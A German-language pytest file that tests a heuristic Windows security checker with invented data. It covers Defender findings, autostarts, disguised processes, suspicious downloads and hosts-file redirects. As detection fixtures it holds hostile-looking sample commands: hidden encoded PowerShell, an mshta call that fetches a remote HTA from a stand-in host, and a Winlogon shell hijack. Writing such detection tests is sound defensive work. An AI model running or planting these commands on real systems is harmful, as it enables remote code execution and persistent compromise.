"""Sicherheits-Check: Faustregeln mit erfundenen Daten (ohne echten PC-Scan)."""
from __future__ import annotations

from pathlib import Path

from assistant import sicherheit
from assistant.sicherheit import Orte, bewerten, programm_aus_befehl
from assistant.tools import build_registry
from assistant.tools.base import ToolContext

ORTE = Orte(windows="c:\\windows", benutzer="c:\\users\\max",
            temp=["c:\\users\\max\\appdata\\local\\temp", "c:\\windows\\temp"],
            beschreibbar=["c:\\users\\max", "c:\\programdata", "c:\\users\\max\\appdata\\local\\temp",
                          "c:\\windows\\temp"],
            downloads="c:\\users\\max\\downloads")
UNSIGNIERT = {"status": "NotSigned", "signer": ""}
SIGNIERT = {"status": "Valid", "signer": "Valve Corp."}


def _stufen(funde, bereich=None):
    return [(f.stufe, f.titel) for f in funde if bereich is None or f.bereich == bereich]


def test_programm_aus_befehl():
    assert programm_aus_befehl('"C:\\Program Files\\A b\\x.exe" --silent') == "C:\\Program Files\\A b\\x.exe"
    assert programm_aus_befehl("C:\\Users\\max\\App Data\\y.exe -q") == "C:\\Users\\max\\App Data\\y.exe"
    assert programm_aus_befehl("wscript.exe C:\\a\\b.vbs") == "wscript.exe"
    assert programm_aus_befehl("") == ""


def test_saubere_daten_ergeben_keine_funde():
    daten = {"defender": {"aktiv": True, "echtzeit": True, "signaturen": "2099-01-01T00:00:00"},
             "autostart": [{"art": "registry", "name": "Steam", "befehl": '"C:\\Program Files (x86)\\Steam\\steam.exe" -silent'}],
             "prozesse": [{"pid": 4, "name": "steam.exe", "pfad": "C:\\Program Files (x86)\\Steam\\steam.exe"}],
             "dateien": [], "netz": [], "hosts": ["127.0.0.1 localhost"]}
    assert bewerten(daten, {}, ORTE) == []


def test_virenschutz_aus_und_defender_funde():
    daten = {"defender": {"aktiv": True, "echtzeit": False, "signaturen": "2000-01-01T00:00:00"},
             "defender_funde": [
                 {"zeit": "2026-11-03T16:11:00", "name": "Trojan:Win64/Cerbu", "ausgefuehrt": True, "aktiv": False,
                  "dateien": ["C:\\Users\\max\\Desktop\\x\\Injector.exe"], "noch_da": []},
                 {"zeit": "2026-11-05T16:11:00", "name": "Trojan:Win32/Wacatac", "ausgefuehrt": False, "aktiv": False,
                  "dateien": ["C:\\Users\\max\\Downloads\\a.dll"], "noch_da": ["C:\\Users\\max\\Downloads\\a.dll"]},
                 {"zeit": "2026-11-06T16:11:00", "name": "Alt", "ausgefuehrt": False, "aktiv": False,
                  "dateien": ["C:\\x.exe"], "noch_da": []}]}
    funde = bewerten(daten, {}, ORTE)
    st = dict((t, s) for s, t in _stufen(funde))
    assert st["Echtzeitschutz ist aus"] == "hoch"
    assert any(t.startswith("Virendefinitionen") for t in st)
    assert st["Defender-Fund: Trojan:Win32/Wacatac"] == "hoch"      # Datei noch da
    assert st["Defender-Fund: Trojan:Win64/Cerbu"] == "mittel"      # lief, aber entfernt
    assert st["Defender-Fund: Alt"] == "niedrig"
    assert funde[0].stufe == "hoch"  # sortiert


def test_gefaehrliche_autostarts():
    daten = {"autostart": [
        {"art": "registry", "name": "Updater", "befehl": "powershell -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw"},
        {"art": "aufgabe", "name": "\\Sync", "befehl": "mshta.exe https://boese.example/x.hta"},
        {"art": "winlogon", "name": "Shell", "befehl": "explorer.exe, C:\\Users\\max\\AppData\\Roaming\\svc.exe"},
        {"art": "winlogon", "name": "Userinit", "befehl": "C:\\Windows\\system32\\userinit.exe,"},
    ]}
    funde = bewerten(daten, {}, ORTE)
    hoch = [f for f in funde if f.stufe == "hoch"]
    assert len(hoch) == 3
    assert any("verschluesselter PowerShell-Befehl" in g for f in hoch for g in f.gruende)
    assert any("unsichtbar" in g for f in hoch for g in f.gruende)
    assert any("Windows-Anmeldung" in f.titel for f in hoch)


def test_autostart_aus_temp_und_verwaist():
    temp_exe = "C:\\Users\\max\\AppData\\Local\\Temp\\upd.exe"
    weg = "C:\\Users\\max\\AppData\\Local\\Gibtsnicht\\nix.exe"
    daten = {"autostart": [{"art": "registry", "name": "Upd", "befehl": f'"{temp_exe}"'},
                           {"art": "registry", "name": "Alt", "befehl": f'"{weg}" --x'}]}
    funde = bewerten(daten, {temp_exe.lower(): UNSIGNIERT, weg.lower(): {"status": "Fehlt"}}, ORTE)
    st = {f.titel.split(" (")[0]: f for f in funde}
    assert st["Upd"].stufe == "mittel" and "Temp-Ordner" in st["Upd"].gruende[0]
    assert st["Alt"].stufe == "niedrig" and "verwaist" in st["Alt"].gruende[0]


def test_skript_autostart_aus_benutzerordner():
    daten = {"autostart": [{"art": "aufgabe", "name": "\\Backup",
                            "befehl": 'wscript.exe "C:\\Users\\max\\AppData\\Roaming\\tool\\backup.vbs"'}]}
    (fund,) = bewerten(daten, {}, ORTE)
    assert fund.stufe == "niedrig" and "backup.vbs" in fund.gruende[0]


def test_getarnte_programme_und_netz():
    falsch = "C:\\Users\\max\\AppData\\Roaming\\svchost.exe"
    stiller = "C:\\Users\\max\\AppData\\Roaming\\x\\helper.exe"
    eigen = "C:\\Users\\max\\Desktop\\KI-App.exe"
    daten = {"prozesse": [{"pid": 10, "name": "svchost.exe", "pfad": falsch},
                          {"pid": 11, "name": "helper.exe", "pfad": stiller},
                          {"pid": 12, "name": "KI-App.exe", "pfad": eigen},
                          {"pid": 13, "name": "svchost.exe", "pfad": "C:\\Windows\\System32\\svchost.exe"}],
             "netz": [{"pid": 11, "zustand": "Established", "gegen": "45.12.1.9", "gport": 443, "lokal": "10.0.0.2"},
                      {"pid": 11, "zustand": "Established", "gegen": "192.168.0.5", "gport": 80, "lokal": "10.0.0.2"},
                      {"pid": 12, "zustand": "Listen", "lokal": "0.0.0.0", "port": 54089}]}
    funde = bewerten(daten, {falsch.lower(): UNSIGNIERT, stiller.lower(): UNSIGNIERT, eigen.lower(): UNSIGNIERT},
                     ORTE, eigene={eigen})
    st = {f.pfad: f for f in funde}
    assert st[falsch].stufe == "hoch"
    assert st[stiller].stufe == "mittel" and "45.12.1.9:443" in st[stiller].gruende[-1]
    assert "192.168.0.5" not in st[stiller].gruende[-1]
    assert eigen not in st  # Nova selbst wird nicht gemeldet
    assert "C:\\Windows\\System32\\svchost.exe" not in st


def test_neue_dateien():
    dl = "C:\\Users\\max\\Downloads\\"
    daten = {"dateien": [
        {"pfad": dl + "Rechnung.pdf.exe", "groesse": 1000, "erstellt": "2026-11-08T10:00:00"},
        {"pfad": dl + "FreeRobux-Generator.exe", "groesse": 1000, "erstellt": "2026-11-08T10:00:00"},
        {"pfad": dl + "bild.scr", "groesse": 1000, "erstellt": "2026-11-08T10:00:00"},
        {"pfad": dl + "start.vbs", "groesse": 10, "erstellt": "2026-11-08T10:00:00"},
        {"pfad": dl + "setup.exe", "groesse": 10, "erstellt": "2026-11-08T10:00:00"},
        {"pfad": dl + "game.exe", "groesse": 10, "erstellt": "2026-11-08T10:00:00"}]}
    sigs = {(dl + "setup.exe").lower(): SIGNIERT, (dl + "game.exe").lower(): UNSIGNIERT}
    st = {f.titel: f.stufe for f in bewerten(daten, sigs, ORTE)}
    assert st["Rechnung.pdf.exe"] == "hoch"
    assert st["FreeRobux-Generator.exe"] == "mittel"
    assert st["bild.scr"] == "mittel"
    assert st["start.vbs"] == "mittel"
    assert "setup.exe" not in st and "game.exe" not in st  # nur unsigniert reicht nicht


def test_doppelte_defender_funde_werden_zusammengefasst():
    f = {"name": "Trojan:X", "ausgefuehrt": False, "aktiv": False, "dateien": ["C:\\a\\inj.exe"],
         "noch_da": ["C:\\a\\inj.exe"]}
    daten = {"defender_funde": [{**f, "zeit": "2026-11-03T10:00:00", "ausgefuehrt": True},
                                {**f, "zeit": "2026-11-08T10:00:00"}]}
    (fund,) = bewerten(daten, {}, ORTE)
    assert fund.stufe == "hoch" and "2-mal erkannt" in fund.gruende[0]


def test_temp_skripte_als_sammeleintrag_und_windows_pfad_mit_praefix():
    t = "C:\\Users\\max\\AppData\\Local\\Temp\\"
    daten = {"dateien": [{"pfad": t + f"build_{i}.ps1", "groesse": 1, "erstellt": "2026-11-08T10:00:00"}
                         for i in range(3)],
             "prozesse": [{"pid": 7, "name": "conhost.exe", "pfad": "\\\\?\\C:\\Windows\\system32\\conhost.exe"}]}
    (fund,) = bewerten(daten, {}, ORTE)
    assert fund.stufe == "niedrig" and fund.titel == "3 neue Skripte im Temp-Ordner"


def test_ignorieren(tmp_path):
    daten = {"hosts": ["203.0.113.5 x.example"], "dateien": [
        {"pfad": "C:\\Users\\max\\Downloads\\Cheat-Loader.exe", "groesse": 1, "erstellt": "2026-11-08T10:00:00"}]}
    funde = bewerten(daten, {}, ORTE)
    assert len(funde) == 2
    assert "erst einen Scan" in sicherheit.ignorieren(tmp_path, "1")
    sicherheit.speichern("bericht", tmp_path, funde)
    assert "gibt es im letzten Bericht nicht" in sicherheit.ignorieren(tmp_path, "9")
    nr = next(i for i, f in enumerate(funde, start=1) if f.bereich == "Datei")
    assert "Cheat-Loader.exe" in sicherheit.ignorieren(tmp_path, str(nr))
    rest, weg = sicherheit.ignorierte_entfernen(bewerten(daten, {}, ORTE), sicherheit.ignoriert_laden(tmp_path))
    assert weg == 1 and [f.bereich for f in rest] == ["hosts"]
    sicherheit.ignorieren(tmp_path, "C:\\Windows\\System32\\drivers\\etc\\hosts")
    rest, weg = sicherheit.ignorierte_entfernen(bewerten(daten, {}, ORTE), sicherheit.ignoriert_laden(tmp_path))
    assert rest == [] and weg == 2


def test_hosts_umleitungen():
    daten = {"hosts": ["127.0.0.1 localhost", "0.0.0.0 werbung.example", "203.0.113.5 login.bank.example"]}
    (fund,) = bewerten(daten, {}, ORTE)
    assert fund.stufe == "mittel" and "login.bank.example" in fund.gruende[-1]


def test_geheimnisse_werden_entfernt():
    text = sicherheit.geheimnisse_entfernen("app.exe --token=abc123 --password: geheim " + "A" * 50)
    assert "abc123" not in text and "geheim" not in text and "A" * 50 not in text


def test_bericht_und_speichern(tmp_path):
    daten = {"defender": {"aktiv": True, "echtzeit": True, "signaturen": "2099-01-01T00:00:00", "vollscan": ""},
             "hosts": ["203.0.113.5 x.example"], "autostart": [], "prozesse": [], "netz": [], "dateien": []}
    funde = bewerten(daten, {}, ORTE)
    text = sicherheit.bericht(daten, funde, gruendlich=False)
    assert "[1] MITTEL - hosts" in text and "Ergebnis: 0 hoch, 1 mittel, 0 niedrig" in text
    assert sicherheit.letzter_bericht(tmp_path) is None
    assert sicherheit.speichern(text, tmp_path) is not None
    assert sicherheit.letzter_bericht(tmp_path) == text


def test_werkzeug(tmp_path, monkeypatch):
    from assistant.config import load_config
    from assistant.permissions import PermissionManager

    registry = build_registry(include_computer=False, include_agents=False)
    assert "sicherheits_check" in registry.names()
    pm = PermissionManager(load_config().permissions, tmp_path, confirm_fn=lambda m, r: True)
    ctx = ToolContext(permissions=pm)
    out, err = registry.execute(ctx, "sicherheits_check", {"aktion": "letzter_bericht", "umfang": "schnell", "pfad": ""})
    assert not err and "noch keinen" in out
    monkeypatch.setattr(sicherheit, "pc_scannen", lambda gruendlich, ordner: (f"OK {gruendlich} {Path(ordner).name}", []))
    out, err = registry.execute(ctx, "sicherheits_check", {"aktion": "pc_scannen", "umfang": "gruendlich", "pfad": ""})
    assert not err and out == f"OK True {tmp_path.name}"
    out, _ = registry.execute(ctx, "sicherheits_check", {"aktion": "datei_pruefen", "umfang": "schnell", "pfad": ""})
    assert "brauche ich einen pfad" in out
